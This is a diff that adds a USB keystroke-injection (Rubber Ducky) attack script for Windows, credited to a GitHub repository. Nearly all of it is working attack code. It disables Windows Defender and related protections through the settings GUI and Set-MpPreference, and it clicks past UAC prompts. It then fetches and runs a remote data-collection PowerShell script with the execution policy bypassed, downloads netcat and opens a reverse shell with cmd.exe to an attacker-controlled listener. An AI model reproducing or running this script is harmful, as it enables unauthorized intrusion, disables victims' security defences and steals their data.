@@ -1,0 +1,111 @@
+REM Written by HonkinWaffles https://github.com/HonkinWaffles/Wi-Fi-Ducky-Scripts
+REM Description: AutoRun Script includes - Disable Defender, Data Collection, Reverse Shell
+
+REM !! REQUIREMENTS !!
+REM Security Features must be enabled for this to work correctly
+REM Default or disabled UAC
+
+REM !! CHANGES REQUIRED !! 
+REM <HOSTED URL1> - URL to where datagrab.ps1 is hosted
+REM <HOSTED URL2> - URL to where nc64.exe is hosted
+REM <IP_ADDR> - Change the IP to your listener IP
+REM <PORT>  - Port of listener
+
+
+DEFAULTDELAY 150
+
+REM SCRIPT PART 1
+REM Disable Windows Security Features
+REM !! Security Features must be enabled for this to work correctly !!
+
+DEFAULTDELAY 200
+
+REM Open Windows Defender settings
+CTRL ESC
+DELAY 1000
+STRING Windows Security
+ENTER
+REM Navigate to Realtime Scanning and Disable
+
+DELAY 1000
+ENTER
+TAB
+TAB
+TAB
+TAB
+ENTER
+SPACE
+
+REM Navigate UAC
+DELAY 500
+LEFT
+LEFT
+DELAY 500
+ENTER
+
+REM Close Settings
+DELAY 100
+ALT F4
+
+REM Open Powershell as Administrator (By passing only the UAC prompt not Password)
+GUI r
+STRING powershell
+CTRL SHIFT ENTER
+DELAY 500
+LEFT
+LEFT
+DELAY 500
+ENTER
+DELAY 1000
+
+REM Disable Windows Security Freatures
+STRING Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend
+ENTER
+STRING exit
+ENTER
+
+REM SCRIPT PART 2
+REM Data Collection and email script
+
+DEFAULTDELAY 15
+
+REM Setting up command in PS
+GUI r
+DELAY 200
+STRING powershell /w 1 /C Set-ExecutionPolicy Bypass;wget "<HOSTED URL1>/datagrab.ps1" -o C:\\2643.ps1;C:\\2643.ps1
+DELAY 500
+
+
+REM UAC Prompt
+CTRL SHIFT ENTER
+DELAY 1000
+ALT y
+
+REM SCRIPT PART 3
+REM Description: Powershell and Netcat for reverse shell generation
+
+REM If you do not get a connection after a couple of tries increase the DEFAULTDELAY
+DEFAULTDELAY 150
+
+REM Open Powershell
+GUI r
+STRING powershell
+ENTER
+DELAY 1000
+
+REM Set path to temp
+STRING $path = [System.IO.Path]::GetTempPath()
+ENTER
+STRING Set-Location $path
+ENTER
+
+REM Download nc64.exe
+STRING Invoke-Webrequest http://<HOSTED_URL2>/nc64.exe -OutFile 4323.exe
+ENTER
+
+REM Connect to listener
+STRING ./4323.exe <IP_ADDR> <PORT> -e cmd.exe -d
+ENTER
+
+REM Exit Powershell
+ALT F4
